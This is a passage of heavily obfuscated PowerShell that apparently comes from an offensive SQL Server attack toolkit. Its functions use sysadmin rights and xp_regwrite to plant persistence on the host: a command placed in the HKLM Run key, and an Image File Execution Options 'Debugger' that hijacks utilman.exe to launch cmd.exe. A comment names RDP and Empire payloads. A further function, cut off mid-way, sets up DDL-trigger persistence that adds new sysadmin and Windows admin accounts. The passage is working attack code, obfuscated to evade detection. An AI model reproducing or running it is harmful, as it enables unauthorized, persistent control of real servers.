                    &("{0}{3}{2}{1}{4}"-f'Writ','erbos','-V','e','e') -Message ("$Instance "+': '+'Connect'+'i'+'on'+' '+'Failed'+'.')
                    &("{1}{0}{2}{3}{4}" -f 'e-V','Writ','e','rbos','e')  (' '+'Erro'+'r'+': '+"$ErrorMessage")
                }

                ${n`ULl} = ${TB`LRES`Ul`TS}."ro`Ws".("{1}{0}"-f 'dd','A').Invoke("$ComputerName","$Instance",("{8}{5}{1}{7}{3}{0}{6}{2}{4}{9}" -f' Co','s','d','ble or',' Faile','ce','mman','si','Not Ac','d'))
            }
        }

        
        ${pipE`LiNEIt`e`ms} | &("{3}{0}{4}{1}{2}"-f 'oke-Pa','le','l','Inv','ral') -ScriptBlock ${my`sCRI`ptBlOCk} -ImportSessionFunctions -ImportVariables -Throttle ${T`hR`EAds} -RunspaceTimeout 2 -Quiet -ErrorAction ("{0}{3}{2}{1}"-f'Silently','e','nu','Conti')

        return ${tblre`s`Ults}
    }
}














Function   G`e`T`-sQlpeRS`ISt`REgr`UN
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAndATOry = ${f`A`lsE},
        HELPMESsaGe = {"{10}{14}{6}{11}{2}{12}{5}{1}{8}{13}{9}{7}{0}{4}{3}"-f 't',' a',' o','.','e with',' domain','erv','entica','c','auth','S','er','r','count to ','QL S'})]
        [string]${U`SErna`me},

        [Parameter(manDAToRy = ${FA`LSE},
        HeLpMEssAGE = {"{9}{1}{10}{11}{8}{3}{6}{2}{4}{5}{7}{0}"-f 'te with.','L','sswor','count p','d t','o a','a','uthentica','in ac','SQ',' Se','rver or doma'})]
        [string]${pas`swoRd},

        [Parameter(maNdatOrY = ${Fa`L`se},
        HelPMeSSaGE = {"{0}{3}{2}{4}{5}{1}{6}" -f'Window','ia','e','s cr','d','ent','ls.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cr`edenT`ial} =  (  GI VariaBle:0459m2).VaLUE::"Em`pty",

        [Parameter(mAnDaTOrY = ${F`A`LSE},
        vaLUefrompiPElInEByPropeRTyNAMe = ${t`RUe},
        hELPmessagE = {"{1}{3}{9}{5}{4}{6}{7}{10}{8}{2}{0}"-f'o.','SQL S','t','er','t','er ins','an','c','o connection ','v','e t'})]
        [string]${iN`S`TaNcE},

        [Parameter(MAnDaToRy = ${fa`lSE},
        vAluEfRoMpIpELiNebYPRopertYNAmE = ${tR`UE},
        HElpMesSAGe = {"{2}{4}{5}{3}{1}{0}{6}"-f'gistry ',' re','Name ','he','of ','t','value.'})]
        [string]${N`AMe} = ("{1}{0}" -f 'acker','H'),

        [Parameter(mandAtOry = ${F`Alse},
        vALuEFROMpipELineBypRopertynAmE = ${TR`UE},
        heLpmEsSaGe = {"{3}{1}{2}{0}" -f'run.','co','mmand to ','The '})]
        [string]${c`OMM`ANd} = ((("{9}{8}{7}{11}{6}{3}{4}{14}{10}{0}{2}{13}{5}{12}{1}" -f '1} O','{2}','u','}Write-Ho','s',':{0}temp{0}iamahacker.','{2','.exe -','ell','PowerSh','{','C ','txt','t-File C','t hacker ')) -F [CHAR]92,[CHAR]124,[CHAR]34),

        [Parameter(MANdatory = ${fAL`se},
        HelpmeSSaGe = {"{1}{6}{7}{0}{4}{10}{14}{9}{2}{5}{13}{3}{8}{12}{11}"-f 'e','S','d','unction is w','r',' when','uppress ','v','rap','rors.  Use','bose ','.','ped',' f','er'})]
        [switch]${s`U`pPRE`SsvERbo`sE}
    )

    Begin
    {
    }

    Process
    {
        
        ${cOm`p`UTErn`A`ME} = &("{4}{2}{1}{0}{3}{6}{5}{7}"-f'p','m','Co','uter','Get-','t','NameFromIns','ance') -Instance ${In`sTan`Ce}

        
        if(-not ${inst`A`NCE})
        {
            ${I`NSTan`ce} = ${enV:CO`MP`UTe`Rn`AMe}
        }

        
        ${tES`TconNECt`ioN} = &("{5}{4}{0}{1}{2}{3}" -f'ec','ti','on','Test','LConn','Get-SQ') -Instance ${ins`TAN`ce} -Username ${u`sEr`NamE} -Password ${PaSs`w`ORD} -Credential ${CREden`T`iaL} -SuppressVerbose | &("{0}{1}{2}" -f 'Where','-Ob','ject') -FilterScript {
            ${_}."st`AtuS" -eq ("{1}{2}{0}"-f 'ible','Acc','ess')
        }
        if(${TeStC`O`Nne`CtIon})
        {
            if( -not ${sUPp`RESSV`ErBoSE})
            {
                &("{0}{4}{1}{3}{2}"-f'Wri','e-V','se','erbo','t') -Message ("$Instance "+': '+'Conn'+'ect'+'io'+'n '+'Succ'+'ess.')
            }
        }
        else
        {
            if( -not ${S`UP`preSs`VeRBose})
            {
                &("{1}{3}{0}{2}" -f'bo','Write','se','-Ver') -Message ("$Instance "+': '+'Co'+'n'+'n'+'ection '+'Fai'+'led.')
            }
            return
        }       

        
        ${i`sS`ySAd`MIn} = &("{1}{4}{0}{3}{2}"-f'ysa','G','Check','dmin','et-SQLS') -Instance ${i`NSTANCE} -Credential ${CrE`dENT`IAL} -Username ${Us`E`RN`Ame} -Password ${PasS`wo`RD} -SuppressVerbose | &("{0}{1}{2}"-f'Select','-Obje','ct') -Property ("{1}{3}{2}{0}"-f 'in','I','ysadm','sS') -ExpandProperty ("{1}{2}{0}"-f 'n','I','sSysadmi')

        
        ${SQlVE`Rs`IONfu`lL} = &("{3}{2}{1}{0}"-f 'nfo','I','er','Get-SQLServ') -Instance ${INST`An`ce} -Username ${us`e`RNamE} -Password ${passw`o`Rd} -Credential ${cRE`d`e`NTiAl} -SuppressVerbose | &("{0}{2}{1}"-f'Selec','ect','t-Obj') -Property ("{2}{0}{4}{3}{1}{5}"-f 'LSer','nNumb','SQ','io','verVers','er') -ExpandProperty ("{1}{5}{3}{4}{0}{2}{6}"-f'e','SQ','rsionN','er','V','LServ','umber')
        if(${sQLvE`R`sIOn`FUlL})
        {
            ${sql`Ver`s`IoNs`h`ORT} = ${sq`l`VeRSI`oNfuLL}.("{0}{1}"-f'S','plit').Invoke('.')[0]
        }

        
        if(${iSsY`s`AdMIN} -ne "Yes")
        {          
            &("{2}{1}{0}{3}"-f'-Verbo','ite','Wr','se') ("$Instance "+': '+'Th'+'is '+'fu'+'n'+'ction '+'r'+'eq'+'uires '+'s'+'ysadm'+'in '+'p'+'ri'+'vileges. '+'Do'+'ne.')
            Return
        }else{

            &("{0}{3}{1}{2}{4}"-f 'W','e','-Ver','rit','bose') ("$Instance "+': '+'Att'+'empti'+'ng '+'to'+' '+'write'+' '+'value'+': '+"$name")
            &("{4}{1}{0}{2}{3}" -f'-V','ite','er','bose','Wr') ("$Instance "+': '+'At'+'te'+'mpting '+'t'+'o '+'w'+'rite'+' '+'c'+'o'+'mmand: '+"$command")
        }

        
        ${Q`UERY} = ('
 '+' '+' '+' '+' '+' '+' '+'------'+'-'+'------'+'----'+'--------------'+'-----'+'-------'+'--
 '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Use'+' '+'xp_regwr'+'it'+'e'+' '+'to'+' '+'config'+'ur'+'e '+'
 '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'a '+'f'+'ile '+'to'+' '+'exec'+'ute'+' '+'s'+'a '+'c'+'omm'+'and '+'whe'+'n '+'use'+'rs '+'l'+'
 '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'l'+'og '+'in'+'to '+'t'+'he '+'s'+'ystem
 '+' '+' '+' '+' '+' '+' '+' '+'-----'+'--'+'-----'+'---'+'------'+'-----------------'+'------'+'-'+'-
 '+' '+' '+' '+' '+' '+' '+' '+'EXE'+'C '+'ma'+'ster..xp_regw'+'rit'+'e
'+' '+' '+' '+' '+' '+' '+' '+' '+'@ro'+'otkey'+' '+' '+' '+' '+' '+'= '+('{0'+'}H'+'K'+'EY_LO'+'CAL_MACHINE{0},
'+' ')  -f [cHar]39+' '+' '+' '+' '+' '+' '+' '+'@k'+'ey '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+('us3Softwarez'+'m'+'H'+'Mi'+'cro'+'softz'+'mHWind'+'ow'+'sz'+'mHCurrent'+'V'+'e'+'r'+'sionzmHRunu'+'s3,'+'
 ')."r`E`plACE"('us3',[StRinG][chAR]39)."rEPl`ACE"(([chAR]122+[chAR]109+[chAR]72),'\')+' '+' '+' '+' '+' '+' '+' '+'@val'+'ue_name'+' '+' '+'= '+"'$Name',
 "+' '+' '+' '+' '+' '+' '+' '+'@t'+'ype '+' '+' '+' '+' '+' '+' '+' '+'= '+('{0}R'+'EG'+'_'+'SZ'+'{0},
 ')  -F[chaR]39+' '+' '+' '+' '+' '+' '+' '+'@va'+'lue '+' '+' '+' '+' '+' '+' '+'= '+"'$Command'")

        
        ${r`eS`ULtS} = &("{3}{1}{2}{0}" -f'y','-SQ','LQuer','Get') -Instance ${i`N`StancE} -Query ${qU`ERy} -Username ${uSe`R`Name} -Password ${PASs`W`Ord} -Credential ${CRe`d`e`NtIal} -SuppressVerbose
        
        
        ${cheC`kQu`e`RY} = ('
 '+' '+' '+' '+' '+' '+' '+' '+'---'+'-'+'------'+'---'+'---------'+'--'+'-------------'+'---'+'-----'+'-------'+'-'+'-----'+'-'+'----'+'----'+'---'+'-'+'-'+'-
 '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'Ge'+'t '+'W'+'indows'+' '+'A'+'uto '+'Lo'+'gin '+'Credent'+'ia'+'ls '+'fro'+'m '+'th'+'e '+'Re'+'gist'+'ry
 '+' '+' '+' '+' '+' '+' '+' '+'-'+'-'+'-----'+'---------------'+'-'+'-'+'-'+'-'+'--'+'--'+'------------------'+'----'+'----'+'--'+'--'+'-------'+'----'+'--
'+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Get'+' '+'AutoL'+'ogi'+'n '+'D'+'efault '+'Doma'+'in'+'
 '+' '+' '+' '+' '+' '+' '+' '+'D'+'ECLAR'+'E '+'@C'+'heckValue'+' '+' '+'S'+'Y'+'SNAME
 '+' '+' '+' '+' '+' '+' '+' '+'EXEC'+'UT'+'E '+'mast'+'er.d'+'b'+'o.xp_regre'+'ad
 '+' '+' '+' '+' '+' '+' '+' '+'@ro'+'otkey	'+'	= '+('N{0}HKEY'+'_LOC'+'AL_MACHIN'+'E'+'{0},
'+' ')-F[ChAR]39+' '+' '+' '+' '+' '+' '+' '+'@key			'+'= '+(('NnKCS'+'oftwar'+'em5X'+'M'+'icrosof'+'t'+'m5XWin'+'do'+'wsm5XCurrent'+'V'+'er'+'sion'+'m'+'5'+'X'+'R'+'unnKC,
 ')-cREPlaCE 'nKC',[char]39  -rEPlaCE 'm5X',[char]92)+' '+' '+' '+' '+' '+' '+' '+'@v'+'alue_'+'name		'+'= '+"N'$Name',
 "+' '+' '+' '+' '+' '+' '+' '+'@value'+'			='+' '+'@Ch'+'eckValu'+'e '+'output
'+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Dis'+'pla'+'y '+'Result'+'s
'+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'L'+'ECT '+'Chec'+'k'+'Value '+'= '+'@Ch'+'ec'+'kValue')

        
        ${CH`e`ckReSU`l`Ts} = &("{3}{1}{0}{2}"-f 'Qu','et-SQL','ery','G') -Instance ${ins`TA`NCe} -Query ${C`Hec`KqUErY} -Username ${us`eRna`me} -Password ${P`ASsWo`RD} -Credential ${c`RE`de`NtiAl} -SuppressVerbose  
        ${CHeC`KcO`M`maNd} = ${C`hec`Kr`ESul`Ts}."chEcK`VaL`Ue"   
        if(${chEck`co`mmand}."L`e`NgtH" -ge 2){
            &("{1}{2}{0}{3}"-f 'o','Write','-Verb','se') ("$Instance "+': '+'Reg'+'is'+'t'+'ry '+'e'+'n'+'try '+'w'+'r'+'itten.')                   
        }else{
            &("{1}{0}{2}" -f 'Ve','Write-','rbose') ("$Instance "+': '+'Fail'+' '+'t'+'o '+'write'+' '+'to'+' '+'regi'+'stry'+' '+'d'+'ue '+'to'+' '+'i'+'nsuf'+'ficien'+'t '+'pr'+'ivilege'+'s.')
        } 
    }

    End
    {
        
        &("{1}{2}{0}" -f'Verbose','Wri','te-') ("$Instance "+': '+'Don'+'e.')
    }
}





Function   Ge`T-`s`qLPerSIstR`eG`deb`UGGEr
{
    
    [CmdletBinding()]
    Param(
        [Parameter(manDaToRY = ${fAl`Se},
        HElPMessaGE = {"{0}{2}{7}{5}{10}{3}{8}{9}{6}{4}{1}"-f 'S','ate with.','QL Server','unt to','tic','or doma','en',' ',' aut','h','in acco'})]
        [string]${Us`eR`NAme},

        [Parameter(MAndaTORY = ${f`Alse},
        HELPmEssaGe = {"{10}{3}{2}{7}{5}{4}{8}{6}{1}{0}{9}" -f'enticat','o auth','ai','om','count ','c','rd t','n a','passwo','e with.','SQL Server or d'})]
        [string]${PAssw`orD},

        [Parameter(manDaTORy = ${FAl`sE},
        HeLPmEsSAge = {"{2}{1}{3}{0}{4}"-f'ows ','i','W','nd','credentials.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CreD`en`Tial} =  (VaRIAblE  0459m2  -vALUeoNL)::"emP`TY",

        [Parameter(MANdAtory = ${f`Al`Se},
        valUeFRompIpeLINebyPROPERTyNAme = ${T`RuE},
        HeLPmEsSaGe = {"{2}{8}{6}{10}{9}{5}{4}{1}{3}{7}{0}" -f'.','connec','SQ','tion','stance to ','n',' Server',' to','L','i',' '})]
        [string]${Inst`An`ce},

        [Parameter(manDAToRY = ${fal`sE},
        valuEfRomPipELIneBYProPertyNAmE = ${T`RuE},
        helPMEsSAGE = {"{1}{2}{3}{4}{0}{5}" -f 'str','N','a','me of the re','gi','y value.'})]
        [string]${File`N`A`mE}= ("{0}{1}{2}" -f 'ut','ilman.','exe'),

        [Parameter(mANdAtoRY = ${Fa`LsE},
        vAlUefRomPiPElineByprOpErTyname = ${T`RuE},
        hElPMeSsagE = {"{0}{3}{2}{5}{4}{1}" -f 'T','n.','e comman','h','to ru','d '})]
        [string]${c`Om`mAND} = ((("{5}{0}{2}{1}{4}{3}"-f 'wind','w','o','md.exe','sheosystem32heoc','c:heo'))."R`EPL`Ace"(([cHar]104+[cHar]101+[cHar]111),'\')),

        [Parameter(MAnDATORY = ${fa`Lse},
        HelpMesSagE = {"{5}{16}{8}{7}{1}{2}{11}{6}{10}{4}{12}{15}{0}{9}{13}{3}{14}" -f 'u','o','se errors.',' is wrap','whe','Supp',' ','erb','v','n','Used ',' ','n','ction','ped.',' f','ress '})]
        [switch]${su`ppre`S`SVE`RbOse}
    )

    Begin
    {
    }

    Process
    {
        
        ${c`oMp`UT`eR`NAME} = &("{5}{4}{0}{3}{7}{8}{6}{1}{2}"-f 'e','tan','ce','rN','-Comput','Get','eFromIns','a','m') -Instance ${IN`S`Tan`CE}

        
        if(-not ${i`NSTa`NCE})
        {
            ${iNSTaN`Ce} = ${eNv:`COm`p`Uter`Name}
        }

        
        ${tes`TcoNN`ec`TION} = &("{0}{4}{1}{3}{2}{5}{6}" -f 'Get-','LCon','o','necti','SQ','nTe','st') -Instance ${iN`s`TaNce} -Username ${us`ErNa`Me} -Password ${pasSwO`Rd} -Credential ${Cr`ED`entIAl} -SuppressVerbose | &("{0}{1}{3}{2}"-f 'Where','-Ob','t','jec') -FilterScript {
            ${_}."S`TATUs" -eq ("{2}{0}{1}"-f 'ss','ible','Acce')
        }
        if(${TEs`TC`o`NNecTion})
        {
            if( -not ${SuPP`Re`Ssv`e`RBOsE})
            {
                &("{0}{3}{4}{1}{2}" -f 'Writ','bo','se','e-V','er') -Message ("$Instance "+': '+'Connec'+'tio'+'n '+'Succ'+'ess'+'.')
            }
        }
        else
        {
            if( -not ${SuP`P`ResS`VER`BOsE})
            {
                &("{0}{2}{1}{3}"-f 'Wr','os','ite-Verb','e') -Message ("$Instance "+': '+'Conn'+'e'+'ction'+' '+'Fa'+'i'+'led.')
            }
            return
        }       

        
        ${i`SsyS`AD`MIn} = &("{1}{0}{3}{2}{4}"-f 'SQLS','Get-','dm','ysa','inCheck') -Instance ${IN`StAn`CE} -Credential ${C`REDEn`TIAL} -Username ${U`s`ERnA`ME} -Password ${PAs`swO`RD} -SuppressVerbose | &("{3}{1}{2}{0}"-f't','lect-','Objec','Se') -Property ("{1}{2}{0}"-f 'min','I','sSysad') -ExpandProperty ("{0}{3}{1}{2}" -f'Is','ad','min','Sys')

        
        ${S`QlV`ErS`iONFUlL} = &("{3}{1}{0}{2}{4}"-f 'Q','-S','LServerInf','Get','o') -Instance ${InS`TaN`cE} -Username ${Use`RnAmE} -Password ${P`ASs`WorD} -Credential ${cr`ede`NTiAL} -SuppressVerbose | &("{1}{2}{0}" -f 'Object','S','elect-') -Property ("{3}{4}{2}{6}{0}{1}{5}"-f 'Version','Nu','L','S','Q','mber','Server') -ExpandProperty ("{1}{6}{3}{5}{0}{4}{2}" -f 'b','SQLSer','r','rVe','e','rsionNum','ve')
        if(${SqlVersi`on`FUlL})
        {
            ${sqLVe`RSion`SH`ORt} = ${s`qL`VErsio`NfUll}.("{0}{1}" -f 'S','plit').Invoke('.')[0]
        }

        
        if(${ISS`ySaD`mIN} -ne "Yes")
        {          
            &("{0}{3}{2}{1}" -f'W','ose','b','rite-Ver') ("$Instance "+': '+'This'+' '+'f'+'uncti'+'on '+'r'+'e'+'quires '+'sysadm'+'in'+' '+'p'+'rivileg'+'es.'+' '+'Do'+'ne.')
            Return
        }else{

            &("{2}{1}{0}"-f'se','erbo','Write-V') ("$Instance "+': '+'A'+'ttempti'+'ng '+'t'+'o '+'wr'+'it'+'e '+'debu'+'gge'+'r: '+"$FileName")
            &("{2}{0}{1}"-f'V','erbose','Write-') ("$Instance "+': '+'A'+'ttemptin'+'g '+'to'+' '+'wr'+'ite'+' '+'c'+'omma'+'nd: '+"$Command")
        }

        
        ${q`UERy} = ('
 '+' '+' '+' '+' '+' '+' '+'--'+'- '+'Th'+'is '+'w'+'ill '+'create'+' '+'a '+'re'+'gi'+'stry '+'ke'+'y '+'throu'+'gh '+'SQL'+' '+'S'+'erver '+'('+'as '+'sy'+'sadmin)
'+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'t'+'o '+'r'+'un '+'a '+'d'+'efine'+'d '+'deb'+'u'+'gg'+'er '+'(an'+'y '+'command'+')'+' '+'inst'+'ea'+'d '+'of'+' '+'int'+'end'+'ed '+'comm'+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'i'+'n '+'th'+'e '+'examp'+'l'+'e '+'utilman'+'.exe'+' '+'c'+'an '+'b'+'e '+'repl'+'ace '+'with'+' '+'cmd.e'+'xe'+' '+'a'+'nd '+'ex'+'e'+'cuted '+'on'+' '+'de'+'mand '+'v'+'ia '+'r'+'dp
 '+' '+' '+' '+' '+' '+' '+' '+'---'+' '+'n'+'ote: '+'th'+'is '+'cou'+'ld'+' '+'e'+'as'+'ily '+'be'+' '+'a '+'em'+'p'+'i'+'re/other'+' '+'pa'+'yload
'+' '+' '+' '+' '+' '+' '+' '+' '+'EXEC'+' '+'maste'+'r.'+'.xp_'+'r'+'egw'+'rite
 '+' '+' '+' '+' '+' '+' '+' '+'@root'+'key'+' '+' '+' '+' '+' '+'= '+('{0}HKE'+'Y_LOCAL_MACHIN'+'E{'+'0},'+'
'+' ') -f  [Char]39+' '+' '+' '+' '+' '+' '+' '+'@'+'key '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+('2m'+'p'+'SOF'+'TWAREzt'+'xMicr'+'oso'+'ft'+'ztxW'+'indows ')."rEP`laCe"(([cHAr]50+[cHAr]109+[cHAr]112),[StrInG][cHAr]39)."R`epLA`CE"(([cHAr]122+[cHAr]116+[cHAr]120),[StrInG][cHAr]92)+('N'+'T{'+'0}Curren'+'tV'+'er'+'sion'+'{0}Ima'+'ge'+' ') -F [CHaR]92+'Fil'+'e '+'Exe'+'c'+'ution '+"Options\$FileName',
 "+' '+' '+' '+' '+' '+' '+' '+'@val'+'ue_'+'name '+' '+'= '+('{0}De'+'b'+'ugg'+'er{'+'0},
 ')-f[CHaR]39+' '+' '+' '+' '+' '+' '+' '+'@t'+'y'+'pe '+' '+' '+' '+' '+' '+' '+' '+'= '+(('n'+'gbRE'+'G_SZng'+'b,'+'
 ')-rEpLAcE  ([ChAR]110+[ChAR]103+[ChAR]98),[ChAR]39)+' '+' '+' '+' '+' '+' '+' '+'@'+'value '+' '+' '+' '+' '+' '+' '+'= '+"'$Command'")

        
        ${ReS`UlTs} = &("{0}{2}{1}"-f'Get-SQ','Query','L') -Instance ${In`st`ANcE} -Query ${QUe`Ry} -Username ${US`e`RNAmE} -Password ${p`AsSWorD} -Credential ${C`Re`dENTial} -SuppressVerbose
        
        
        ${Ch`E`cKQueRY} = ('
 '+' '+' '+' '+' '+' '+' '+' '+'---'+'--'+'--'+'---'+'--'+'----------'+'-'+'------'+'---------'+'-'+'-'+'----'+'---'+'-'+'---'+'-'+'--'+'----'+'--'+'-----'+'-----'+'---
 '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'Get'+' '+'Wind'+'ows '+'Auto'+' '+'L'+'ogi'+'n '+'Cr'+'ede'+'ntials'+' '+'fro'+'m '+'t'+'he '+'R'+'egistr'+'y
 '+' '+' '+' '+' '+' '+' '+' '+'----'+'--'+'---'+'----------------'+'-------'+'---'+'------'+'----'+'---'+'-------'+'--'+'--'+'--'+'--'+'----------
 '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'Ge'+'t '+'Au'+'to'+'Logi'+'n '+'De'+'fault'+' '+'D'+'omain
'+' '+' '+' '+' '+' '+' '+' '+' '+'DECL'+'AR'+'E '+'@Ch'+'eckValue'+' '+' '+'SY'+'SNAME
 '+' '+' '+' '+' '+' '+' '+' '+'E'+'XECUTE '+'mas'+'ter.dbo'+'.x'+'p'+'_'+'regread'+'
 '+' '+' '+' '+' '+' '+' '+' '+'@rootke'+'y		='+' '+('N'+'ehCHK'+'EY'+'_LO'+'CA'+'L_MACHINEe'+'hC,
 ')."R`EP`LaCE"(([char]101+[char]104+[char]67),[STRiNg][char]39)+' '+' '+' '+' '+' '+' '+' '+'@key	'+'		'+'= '+('N{1}SOF'+'TWARE{0}M'+'icr'+'o'+'sof'+'t{0}'+'Wi'+'n'+'dows'+' ')-F [chAr]92,[chAr]39+(('NTNBxCu'+'rrent'+'VersionNB'+'xImag'+'e ')  -cREpLaCe  ([cHAr]78+[cHAr]66+[cHAr]120),[cHAr]92)+'Fi'+'le '+'Exec'+'ution'+' '+"Options\$FileName',
 "+' '+' '+' '+' '+' '+' '+' '+'@'+'va'+'lue_nam'+'e		='+' '+('N{'+'0}Debugger{'+'0'+'},
'+' ')-F[ChAr]39+' '+' '+' '+' '+' '+' '+' '+'@'+'valu'+'e			='+' '+'@'+'Che'+'ckValue'+' '+'o'+'utput'+'
 '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Disp'+'lay'+' '+'Resu'+'l'+'ts'+'
 '+' '+' '+' '+' '+' '+' '+' '+'SEL'+'EC'+'T '+'Ch'+'e'+'c'+'kValue '+'= '+'@C'+'hec'+'kValue')

        
        ${cHeck`R`esu`lTs} = &("{0}{2}{1}"-f'Get-SQL','ry','Que') -Instance ${in`STANce} -Query ${chEckQU`e`RY} -Username ${US`ERNa`ME} -Password ${p`AS`SwoRD} -Credential ${C`Rede`NtiaL} -SuppressVerbose  
        ${cHecKc`Omm`ANd} = ${cHE`CK`ResULTS}."ch`EC`Kv`AluE"   
        if(${ChE`Ck`commA`ND}."lEng`Th" -ge 2){
            &("{0}{2}{1}"-f 'W','e','rite-Verbos') ("$Instance "+': '+'R'+'e'+'gistry '+'entry'+' '+'writte'+'n.')                   
        }else{
            &("{2}{0}{1}" -f'rite-Ver','bose','W') ("$Instance "+': '+'F'+'ail '+'t'+'o '+'w'+'rite '+'to'+' '+'r'+'egi'+'s'+'try '+'du'+'e '+'to'+' '+'insu'+'ffici'+'en'+'t '+'p'+'rivi'+'leges.')
        } 
    }

    End
    {
        
        &("{2}{3}{0}{1}"-f 'Ver','bose','Wr','ite-') ("$Instance "+': '+'Do'+'ne.')
    }
}






Function gET-s`QlpeR`SisTtrI`GGE`RddL
{
    

  [CmdletBinding()]
  Param(
    
    [Parameter(MaNdatorY = ${f`AlSe},
    hELpMeSsAge = {"{1}{3}{4}{2}{0}"-f' with.','U','me to authenticate','se','rna'})]
    [string]${U`SERNa`Me},

    [Parameter(MAndATOrY = ${Fal`SE},
    hElPmesSaGe = {"{4}{7}{5}{3}{0}{2}{1}{6}"-f'ut',' w','henticate','d to a','P','wor','ith.','ass'})]
    [string]${PasSwO`RD},

    [Parameter(mANDatoRY=${Fa`lSE},
    HElpMESsAGe={"{2}{10}{7}{8}{6}{5}{11}{1}{12}{0}{9}{3}{4}"-f 'mi','sys','Set user','l','ogin.','w S','ne','e for',' ','n ','nam','QL Server ','ad'})]
    [string]${nE`Ws`qLUser},
    
    [Parameter(maNdaTOrY=${F`A`lSe},
    HElpmEsSAGE={"{1}{8}{0}{2}{6}{4}{9}{7}{5}{3}"-f'sword fo','Set pa','r new','.','L Serve','in',' SQ',' sysadmin log','s','r'})]
    [string]${ne`WSQLPa`SS},

    [Parameter(MANdAtOry=${fA`LsE},
    heLpMEssAgE={"{0}{4}{10}{7}{1}{11}{3}{9}{8}{5}{6}{2}"-f 'Set u',' ','.','l ','ser','inistrator accou','nt','me for new Windows','m','ad','na','loca'})]
    [string]${nEW`oS`USER},
    
    [Parameter(mANDATORY=${f`AlSE},
    hElPMeSsAgE={"{2}{1}{6}{9}{7}{8}{0}{10}{5}{4}{11}{3}"-f 'w','rd','Set passwo','istrator account.','al a','loc',' ','or new Win','do','f','s ','dmin'})]
    [string]${ne`WoSpa`SS},

    [Parameter(maNDaTOry=${F`A`Lse},
    helPmeSSaGE={"{8}{2}{7}{6}{9}{4}{10}{3}{5}{1}{0}"-f 'mand.','l com','e ','the p','er that will r','rovide PowerShel','ig','tr','Creat','g','un '})]
    [string]${pSC`om`MAND},

    [Parameter(maNdATOry = ${f`AL`se},
    VaLuEfROmpiPelINEbypropertyNAME = ${tR`Ue},
    helPmeSsaGe = {"{3}{10}{0}{2}{9}{8}{5}{6}{7}{1}{4}"-f'L Serve','n ','r','S','to.','o c','onn','ectio','stance t',' in','Q'})]
    [string]${i`NSTaN`ce},

    [Parameter(mANdAToRy=${fAl`sE},
    HELpMESsAgE={"{8}{0}{13}{16}{10}{4}{15}{5}{11}{14}{1}{7}{9}{12}{6}{3}{2}{17}"-f' will remove t','gger create ','pt','i','i','_DDL_','s scr','by ','This','th','gger named ev','tr','i','he ','i','l','tri','.'})]
    [Switch]${Re`Mo`Ve}
  )

    
    
    
    
    
    ${C`onN} = &("{2}{0}{1}" -f 'ec','t','New-Obj') ("{4}{6}{9}{5}{7}{0}{8}{2}{3}{10}{1}" -f'Cl','nnection','Sq','lC','S','a','ystem.','.Sql','ient.','Dat','o')
    
    
    if(${u`serN`AmE}){
    
        
        &("{0}{1}{2}"-f 'Writ','e-Verbos','e') ("$Instance "+': '+'Attem'+'pt'+'ing '+'t'+'o '+'authe'+'ntica'+'te '+'t'+'o '+"$Instance "+'w'+'ith '+'SQ'+'L '+'logi'+'n '+"$Username...")
        ${co`Nn}."coNnEcT`I`o`N`STRIng" = ("Server=$Instance;Database=master;User "+"ID=$Username;Password=$Password;")
        [string]${coN`Nect`UsER} = ${uSeRn`A`Me}
    }else{
            
        
        &("{1}{3}{2}{0}{4}"-f '-Ver','Wr','e','it','bose') ("$Instance "+': '+'Att'+'e'+'m'+'pting '+'t'+'o '+'a'+'uthent'+'ic'+'ate '+'to'+' '+"$Instance "+'a'+'s '+'t'+'he '+'curr'+'en'+'t '+'W'+'indow'+'s '+'us'+'er'+'...')
        ${co`Nn}."c`OnNeC`TI`OnSTriNG" = ("Server=$Instance;Database=master;Integrated "+'Sec'+'uri'+'ty=SSPI;')   
        ${USeR`DO`m`AiN} =   ( gEt-chILDItem  VARIaBLe:Ohrm ).ValUE::"UsE`RDoMaiN`NaMe"
        ${d`USeR`NAMe} =  (VARIabLE ('oh'+'rM') ).VaLuE::"UsE`RnA`mE"
        ${CONNECT`U`sER} = "$UserDomain\$DUsername"                    
     }


    
    
    

    try{
        ${CO`Nn}.("{1}{0}"-f 'pen','O').Invoke()
        &("{1}{2}{0}" -f 'e','Write-Ver','bos') ("$Instance "+': '+'C'+'onn'+'ected.') 
        ${c`OnN}.("{0}{1}"-f'Cl','ose').Invoke()
    }catch{
        ${e`Rror`MEs`SAge} = ${_}."Ex`ce`PtioN"."m`Es`sAGe"
        &("{2}{0}{3}{4}{1}" -f'i','rbose','Wr','te-V','e') ("$Instance "+': '+'Co'+'nn'+'ection '+'fail'+'ed') 
        &("{0}{3}{2}{1}"-f 'Writ','rbose','-Ve','e') ("$Instance "+': '+'E'+'rr'+'or: '+"$ErrorMessage")  
        Break
    }


    
    
    

    
    ${cO`NN}.("{0}{1}" -f 'Op','en').Invoke()

    
    ${qU`eRY} = ((("{6}{9}{7}{1}{2}{10}{5}{11}{8}{3}{0}{4}" -f'ys','is_','srvrolem','inLYr) as s','status','sys','sele',' ','dm','ct','ember(LYr','a'))-replAcE ([CHar]76+[CHar]89+[CHar]114),[CHar]39)

    
    ${C`mD} = &("{0}{3}{2}{1}"-f'New','ct','e','-Obj') ("{3}{5}{2}{4}{1}{0}" -f'Client.SqlCommand','ta.Sql','em.D','Sys','a','t')(${Q`U`eRY},${cO`Nn})
    ${r`eS`ULTs} = ${C`md}.("{0}{1}{2}"-f'E','x','ecuteReader').Invoke() 

    
